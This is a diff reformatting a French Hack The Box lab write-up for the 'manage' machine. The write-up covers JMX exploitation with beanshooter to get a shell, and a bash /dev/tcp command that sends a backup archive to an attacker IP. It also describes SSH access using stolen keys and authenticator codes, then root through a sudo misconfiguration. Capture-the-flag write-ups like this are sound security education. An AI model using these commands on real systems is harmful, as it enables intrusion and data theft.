@@ -1,22 +1,23 @@
 ---
-title:
-description:
-tags:
-  - HTB
-  - machine
+layout: writeup
+title: manage
+description: ''
+excerpt: ''
 date: 2026-03-24T20:46
-tasks:
-  - format
-parent file:
-  - 
+platform: htb
+permalink: /writeups/htb/season8/manage/
 os: linux
 difficulty: easy
-category:
-  - writeups
-  - htb
-season: "8"
-seasonal: no
+season: '8'
+tags:
+- HTB
+- linux
+- easy
+prev_url: /writeups/htb/season8/twomillion/
+next_url: /writeups/htb/season8/reset/
 ---
+
+{% raw %}
 
 # Foothold
 
@@ -115,7 +116,7 @@ java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar tonka shell manage.
 ```
 
 Et avec ça on a notre premier accès.
-![[Pasted image 20260330135527.png]]
+<img class="content-image" src="/assets/content/htb/season8-manage/Pasted%20image%2020260330135527.png" alt="manage" loading="lazy">
 
 # Privilege Escalation to user
 
@@ -131,10 +132,10 @@ bash -c 'cat /home/useradmin/backups/backup.tar.gz >& /dev/tcp/10.10.15.35/4443 
 ```
 
 Sur la machine on extrait le fichier et on lit le contenu.
-![[Pasted image 20260330135653.png]]
+<img class="content-image" src="/assets/content/htb/season8-manage/Pasted%20image%2020260330135653.png" alt="manage" loading="lazy">
 
 On tente d'utiliser le fichier `.ssh/id_ed25529` pour se connecter mais le ssh demande un code de vérification. On fouille un peu et on voit que l'on a aussi obtenu un fichier `.google_authenticator`. En regardant à l'intérieur on voit une suite de codes. on tente d'en rentrer un et bingo, on obtient un accès user!
-![[Pasted image 20260330135819.png]]
+<img class="content-image" src="/assets/content/htb/season8-manage/Pasted%20image%2020260330135819.png" alt="manage" loading="lazy">
 
 # PrivEsc to root
 
@@ -154,9 +155,10 @@ User useradmin may run the following commands on manage:
 
 En fait il faut le savoir, ubuntu a un utiliser `admin` qui a par défaut toutes les permissions de root, mais si l'on regarde ici, on ne trouve pas de tel utilisateur, on peut donc le créer et facilement accéder à un utilisateur avec les droits root.
 
-![[Pasted image 20260330163416.png]]
+<img class="content-image" src="/assets/content/htb/season8-manage/Pasted%20image%2020260330163416.png" alt="manage" loading="lazy">
 
 Et voilà, on a nos deux flags
 
-![[Pasted image 20260330163656.png]]
+<img class="content-image" src="/assets/content/htb/season8-manage/Pasted%20image%2020260330163656.png" alt="manage" loading="lazy">
 
+{% endraw %}
